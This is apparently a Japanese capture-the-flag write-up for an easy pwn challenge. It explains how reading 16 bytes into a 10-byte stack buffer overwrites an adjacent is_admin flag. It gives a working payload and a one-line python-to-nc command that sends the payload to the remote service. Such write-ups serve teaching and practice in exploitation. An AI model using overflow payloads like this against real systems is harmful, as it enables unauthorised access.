---
title: simpleoverflow
category: pwn
genre: stack-overflow
difficulty: easy
tags:
  - adjacent-variable-overwrite
  - read-overflow
  - stack
source: simpleoverflow/src.c
solved_at: 2026-05-29
---

# simpleoverflow

## 問題の要点

`buf` は 10 bytes だが、`read(0, buf, 0x10)` で 16 bytes 読む。
隣接する `is_admin` を非 0 にできれば flag 表示分岐に入る。

```c
char buf[10] = {0};
int is_admin = 0;
read(0, buf, 0x10);
```

## 解き方

payload:

```python
payload = b"A" * 10 + b"\x01\x00\x00\x00"
```

remote では標準入力にこの payload を送る。

```sh
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*10 + b"\x01\x00\x00\x00")' | nc HOST PORT
```

`is_admin != 0` になり、`/bin/cat ./flag.txt` が実行される。

## 連携する知見

- [Pwn](../../../insights/pwn.md)
- [Pwn relations](../../../relations/pwn.md)
